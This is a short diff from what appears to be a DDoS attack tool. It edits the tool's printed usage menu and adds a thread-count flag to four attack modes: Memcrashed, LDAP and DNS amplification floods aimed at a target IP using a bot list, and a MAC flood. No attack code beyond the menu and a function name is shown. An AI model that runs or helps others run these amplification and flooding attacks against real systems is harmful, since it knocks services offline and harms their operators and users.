@@ -47,10 +47,10 @@ def macflood(target, powers):
 
 print("""
 
-1. Memcrashed: -A 1 -T xx.xx.xx.xx -F bot.txt -T 1 -N 40
-2. LDAP:       -A 2 -T xx.xx.xx.xx -F bot.txt -T 1 -N 40
-3. DNS:        -A 3 -T xx.xx.xx.xx -F bot.txt -T 1 -N 40
-4. Mac-flood:  -A 4 -T FFFF.FFFF.FFFF         -T 1 -N 40
+1. Memcrashed: -A 1 -T xx.xx.xx.xx -F bot.txt -T 1 -N 40 -Thread 10
+2. LDAP:       -A 2 -T xx.xx.xx.xx -F bot.txt -T 1 -N 40 -Thread 10
+3. DNS:        -A 3 -T xx.xx.xx.xx -F bot.txt -T 1 -N 40 -Thread 10
+4. Mac-flood:  -A 4 -T FFFF.FFFF.FFFF         -T 1 -N 40 -Thread 10
 
   """)
 
